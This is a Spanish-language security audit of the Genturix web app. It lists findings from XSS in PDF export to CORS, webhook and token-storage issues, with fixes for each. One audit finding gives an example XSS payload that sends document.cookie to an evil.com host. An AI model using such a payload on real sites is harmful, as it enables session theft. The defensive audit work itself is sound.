# REPORTE DE AUDITORÍA DE SEGURIDAD - GENTURIX
## Auditoría Profunda de Seguridad y Arquitectura

**Fecha:** Diciembre 2025  
**Auditor:** Senior Security Engineer & Full Stack Auditor  
**Alcance:** Análisis completo del código fuente, configuración, y arquitectura  
**Revisión:** v1.1 - Severidades ajustadas tras verificación de exposición

---

## RESUMEN EJECUTIVO

La auditoría del proyecto Genturix revela una aplicación con **fundamentos de seguridad sólidos** y **buenas prácticas implementadas**. Se identificaron vulnerabilidades que requieren atención, aunque **no se detectó exposición pública de secretos**.

| Severidad | Cantidad | Estado |
|-----------|----------|--------|
| 🔴 **CRÍTICO** | 2 | Requiere acción inmediata |
| 🟠 **ALTO** | 5 | Requiere acción en 7 días |
| 🟡 **MEDIO** | 7 | Planificar remediación |
| 🟢 **BAJO** | 4 | Mejoras recomendadas |

### Verificación de Exposición de Secretos

> ✅ **CONFIRMADO:** No hay exposición pública de secretos.
> - Los archivos `.env` están en `.gitignore` y NO están trackeados en Git
> - No se encontraron secretos en el frontend, bundles, ni logs públicos
> - Los secretos residen únicamente en el servidor privado

---

## 🔴 HALLAZGOS CRÍTICOS (2)

### C-001: Vulnerabilidad XSS en Generación de PDF

**Severidad:** CRÍTICA  
**Ubicación:** `/app/frontend/src/components/ResidentVisitHistory.jsx:452`  
**CWE:** CWE-79 (Cross-site Scripting)

**Código Vulnerable:**
```javascript
const container = document.createElement('div');
container.innerHTML = html; // PELIGROSO: Inyección directa de HTML
```

**Descripción:**
Los datos de visitantes (`visitor_name`, `apartment`, etc.) se insertan directamente en HTML sin sanitización:

```javascript
<td>${entry.visitor_name || 'N/A'}</td>
<td>${exportData.resident_name}</td>
<td>${exportData.apartment}</td>
```

**Vector de Ataque:**
Un atacante podría registrar un visitante con nombre:
```
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

**Impacto:**
- Robo de tokens de sesión
- Ejecución de acciones en nombre del usuario
- Exfiltración de datos sensibles

**Remediación:**
```javascript
// Función de escape HTML
const escapeHtml = (str) => {
  if (!str) return '';
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
};

// Uso seguro
<td>${escapeHtml(entry.visitor_name || 'N/A')}</td>
```

---

### C-002: CORS Wildcard Configurado en Desarrollo

**Severidad:** CRÍTICA  
**Ubicación:** `/app/backend/.env:5`  
**CWE:** CWE-942 (Overly Permissive CORS Policy)

**Configuración Actual:**
```
CORS_ORIGINS="*"
```

**Descripción:**
El archivo `.env` contiene `CORS_ORIGINS="*"`. Aunque el código en `server.py` (líneas 18176-18231) implementa CORS correctamente por ambiente, este valor podría filtrarse a producción si:
- Se copia el `.env` de desarrollo a producción
- Se usa la variable de entorno incorrectamente

**Riesgo:**
- Permite que cualquier sitio web haga requests autenticados
- Facilita ataques CSRF desde dominios maliciosos
- Puede exponer datos de usuarios a terceros

**Mitigación Actual:**
El código actual en `server.py` NO usa `CORS_ORIGINS` del `.env`, sino que tiene lógica hardcodeada segura. Sin embargo, esto es frágil.

**Remediación:**
1. Eliminar la variable `CORS_ORIGINS` del `.env`
2. Documentar que la configuración CORS está en código
3. Agregar validación que rechace `CORS_ORIGINS="*"` si se detecta en producción

---

## 🟡 HALLAZGOS DE SEVERIDAD MEDIA (Reclasificado)

### M-001: Secretos en Archivo `.env` Local

**Severidad:** MEDIA (Reclasificado de CRÍTICA)  
**Ubicación:** `/app/backend/.env`  
**CWE:** CWE-522 (Insufficiently Protected Credentials)

> ⚠️ **NOTA IMPORTANTE:** Este hallazgo fue inicialmente clasificado como CRÍTICO bajo la suposición de exposición pública. Tras verificación, se confirma que **NO hay exposición real**.

**Verificación Realizada:**
| Verificación | Resultado |
|--------------|-----------|
| `.env` en `.gitignore` | ✅ SÍ - No está trackeado |
| Secretos en repositorio Git | ✅ NO - Verificado con `git ls-files` |
| Secretos en frontend source | ✅ NO - Solo `REACT_APP_*` (públicas) |
| Secretos en frontend build | ✅ NO - Bundle limpio |
| Secretos en logs públicos | ✅ NO - No encontrados |

**Ubicación Real de Secretos:**
```
/app/backend/.env  ← ÚNICO lugar (servidor privado)
```

**Contenido del archivo (estructura - valores redactados):**
```
JWT_SECRET_KEY="<REDACTED>"
JWT_REFRESH_SECRET_KEY="<REDACTED>"
STRIPE_API_KEY=sk_test_...
RESEND_API_KEY=re_...
VAPID_PRIVATE_KEY=...
```

**Diferencia entre riesgos:**

| Escenario | Severidad | Estado Actual |
|-----------|-----------|---------------|
| Secretos en repositorio público | 🔴 CRÍTICA | ❌ No aplica |
| Secretos en frontend bundle | 🔴 CRÍTICA | ❌ No aplica |
| Secretos en logs públicos | 🔴 CRÍTICA | ❌ No aplica |
| Secretos en servidor privado | 🟡 MEDIA | ✅ Estado actual |

**Riesgo Real:**
- Si un atacante obtiene acceso al servidor (SSH/shell)
- Si el archivo `.env` se incluye accidentalmente en un commit futuro
- Si se copia a ambientes inseguros

**Remediación (Para Producción):**
1. ✅ Mantener `.env` en `.gitignore` (ya implementado)
2. Usar variables de entorno del sistema en vez de archivo `.env`
3. Considerar gestores de secretos (AWS Secrets Manager, HashiCorp Vault)
4. Agregar pre-commit hook que detecte secretos

---

## 🟠 HALLAZGOS DE SEVERIDAD ALTA (5)

### H-001: Backend Monolítico de 18,392 líneas

**Severidad:** ALTA (Riesgo Operacional)  
**Ubicación:** `/app/backend/server.py`  
**Impacto:** Mantenibilidad, Seguridad, Rendimiento

**Descripción:**
El archivo `server.py` contiene toda la lógica de negocio en un solo archivo:
- 18,392 líneas de código
- Mezcla de autenticación, billing, visitantes, pánico, etc.
- Difícil auditar y mantener
- Alto riesgo de introducir bugs de seguridad

**Riesgos de Seguridad:**
- Difícil detectar vulnerabilidades en código tan extenso
- Cambios pueden introducir regresiones de seguridad
- Code review ineficiente

**Remediación:**
Refactorizar en módulos:
```
/app/backend/
├── routes/
│   ├── auth.py
│   ├── billing.py
│   ├── visitors.py
│   └── ...
├── services/
├── models/
└── middleware/
```

---

### H-002: Webhook de Stripe Sin Verificación en Desarrollo

**Severidad:** ALTA  
**Ubicación:** `/app/backend/server.py:12829-12830`  
**CWE:** CWE-345 (Insufficient Verification of Data Authenticity)

**Código:**
```python
if not STRIPE_WEBHOOK_SECRET:
    logger.warning("[STRIPE-WEBHOOK] Processing without signature verification...")
```

**Descripción:**
En modo desarrollo, los webhooks de Stripe se procesan sin verificar la firma. Si un atacante descubre el endpoint, puede:
- Simular pagos completados
- Manipular estados de facturación
- Activar suscripciones sin pago real

**Remediación:**
1. Configurar `STRIPE_WEBHOOK_SECRET` en TODOS los ambientes
2. Usar Stripe CLI para desarrollo local con webhooks seguros

---

### H-003: Access Token en localStorage

**Severidad:** ALTA  
**Ubicación:** `/app/frontend/src/contexts/AuthContext.js:29`  
**CWE:** CWE-922 (Insecure Storage of Sensitive Information)

**Código:**
```javascript
const storedAccessToken = localStorage.getItem(STORAGE_KEYS.ACCESS_TOKEN);
```

**Descripción:**
El access token se almacena en `localStorage`, vulnerable a XSS. Si un atacante explota C-001 (XSS en PDF), puede robar el token.

**Nota Positiva:**
El refresh token ya se maneja correctamente vía httpOnly cookie.

**Remediación:**
1. Mover el access token a memoria (React state)
2. Implementar refresh silencioso cuando expire
3. O usar cookies httpOnly para ambos tokens

---

### H-004: DEV_MODE Habilitado en Configuración

**Severidad:** ALTA  
**Ubicación:** `/app/backend/.env:18`  
**CWE:** CWE-489 (Active Debug Code)

**Configuración:**
```
DEV_MODE=true
```

**Descripción:**
Existe validación en código que previene DEV_MODE en producción:
```python
if ENVIRONMENT == "production" and DEV_MODE:
    raise RuntimeError("DEV_MODE cannot be enabled in production")
```

Sin embargo, el archivo `.env` con `DEV_MODE=true` puede filtrarse si no se gestiona correctamente.

**Remediación:**
1. Documentar claramente que `.env` es solo para desarrollo
2. Usar diferentes archivos: `.env.development`, `.env.production`
3. Agregar validación en CI/CD

---

### H-005: Logs con Información Sensible

**Severidad:** ALTA  
**Ubicación:** Múltiples puntos en `server.py`  
**CWE:** CWE-532 (Sensitive Information in Log Files)

**Ejemplos encontrados:**
```python
print(f"[EMAIL TRIGGER] password_reset → sending new password to {recipient_email}")
logger.info(f"[AUTH EVENT] Login attempt | email={normalized_email}")
```

**Riesgo:**
- Emails de usuarios en logs
- IPs de clientes registradas
- Posible exposición de datos personales

**Remediación:**
1. Truncar o hashear emails: `user***@domain.com`
2. No logear contraseñas temporales
3. Implementar política de retención de logs

---

## 🟡 HALLAZGOS DE SEVERIDAD MEDIA (6 adicionales)

### M-002: Sanitización Incompleta de Inputs

**Severidad:** MEDIA  
**Ubicación:** `/app/backend/server.py:328-333`

**Descripción:**
La lista de campos sanitizados es limitada. Faltan campos como `company`, `service_type`, `identification_number`.

---

### M-003: Rate Limiting Solo en Login

**Severidad:** MEDIA  
**Ubicación:** `/app/backend/server.py:229-252`

**Descripción:**
El rate limiting manual solo protege el login. Endpoints como `/api/profile`, `/api/authorizations` no tienen protección efectiva contra abuso.

---

### M-004: Falta de Índices en Campos Críticos

**Severidad:** MEDIA (Rendimiento/DoS)  

**Descripción:**
Faltan índices para consultas frecuentes como `visitor_entries.status`, `audit_logs.timestamp`.

---

### M-005: Validación de Ownership Parcialmente Inconsistente

**Severidad:** MEDIA  

**Descripción:**
Algunos endpoints usan `find_one` directo sin `get_tenant_resource()`, lo que podría permitir acceso cross-tenant si no se valida después.

---

### M-006: Contraseñas Temporales en Response (DEV_MODE)

**Severidad:** MEDIA  

**Descripción:**
En modo desarrollo, las contraseñas generadas pueden ser retornadas en la API. Patrón peligroso aunque protegido.

---

### M-007: Duplicación de Código en CORS

**Severidad:** BAJA (Bug)  
**Ubicación:** `/app/backend/server.py:18219-18220`

**Código:**
```python
        return all_origins
        return all_origins  # DUPLICADO - código muerto
```

---

## 🟢 HALLAZGOS DE SEVERIDAD BAJA (4)

### L-001: Docs de API Habilitados en Desarrollo
Estado: Correctamente implementado. Solo observación.

### L-002: Cookies Sin Prefijo `__Host-`
Usar el prefijo proporcionaría protección adicional contra subdomain attacks.

### L-003: Falta Header CSP
Implementar CSP ayudaría a mitigar XSS adicional.

### L-004: Error Handling Inconsistente
Algunos endpoints retornan errores detallados mientras otros son genéricos.

---

## ASPECTOS POSITIVOS IDENTIFICADOS

✅ **Autenticación JWT robusta** con refresh token rotation  
✅ **Refresh token en httpOnly cookie** (previene robo por XSS)  
✅ **Validación multi-tenant** implementada con `tenant_filter()` y `validate_tenant_resource()`  
✅ **Bcrypt para hashing** de contraseñas  
✅ **Rate limiting** en endpoints de autenticación  
✅ **Audit logging** implementado  
✅ **Sanitización con bleach** para campos principales  
✅ **Validación de webhook Stripe** en producción  
✅ **Session invalidation** tras cambio de contraseña  
✅ **`.env` correctamente excluido** de Git  
✅ **Secretos NO expuestos** públicamente  

---

## TOP 5 RIESGOS ACTUALES (Ordenados por Impacto Real)

| # | Hallazgo | Severidad | Impacto | Acción |
|---|----------|-----------|---------|--------|
| 1 | **XSS en PDF** (C-001) | 🔴 CRÍTICO | Robo de sesión, datos | Arreglar inmediatamente |
| 2 | **CORS Wildcard** (C-002) | 🔴 CRÍTICO | CSRF, leak de datos | Eliminar de .env |
| 3 | **Access Token en localStorage** (H-003) | 🟠 ALTO | Amplifica XSS | Mover a memoria |
| 4 | **Webhook Stripe sin verificar** (H-002) | 🟠 ALTO | Fraude de pagos | Configurar secret |
| 5 | **Backend monolítico** (H-001) | 🟠 ALTO | Bugs, mantenimiento | Planificar refactor |

---

## RECOMENDACIONES PRIORITARIAS

### Fase 1: Crítico (Inmediato)
1. 🛡️ **Arreglar XSS** en `ResidentVisitHistory.jsx` - Escape de HTML
2. ⚠️ **Eliminar CORS_ORIGINS="*"** del archivo `.env`
3. ✅ Verificar `ENVIRONMENT=production` en deployment

### Fase 2: Alto (7 días)
4. Mover access token de localStorage a memoria
5. Habilitar verificación de webhook Stripe en desarrollo
6. Sanitizar logs de información sensible

### Fase 3: Medio (30 días)
7. Expandir campos sanitizados
8. Implementar rate limiting global
9. Agregar índices faltantes en MongoDB
10. Para producción: migrar a secrets manager

### Fase 4: Arquitectura (Planificado)
11. Refactorizar `server.py` en módulos
12. Implementar CSP headers
13. Agregar prefix `__Host-` a cookies

---

## CONCLUSIÓN

El proyecto Genturix demuestra **prácticas de seguridad sólidas** en muchas áreas, particularmente en:
- Gestión de autenticación y tokens
- Aislamiento multi-tenant
- Protección de secretos (NO hay exposición pública)

Los **riesgos reales prioritarios** son:
1. **Vulnerabilidad XSS** que permite robo de sesión
2. **Configuración CORS permisiva** que podría filtrarse a producción

El tamaño del archivo `server.py` (18,392 líneas) es un riesgo operacional que dificulta las auditorías.

**Clasificación General de Seguridad:** ⚠️ **APTO PARA PRODUCCIÓN CON CORRECCIONES MENORES**

> Los hallazgos críticos (XSS, CORS) son corregibles en pocas horas. No hay compromisos fundamentales de arquitectura de seguridad.

---

*Reporte generado por Senior Security Engineer*  
*Diciembre 2025 - Revisión v1.1*
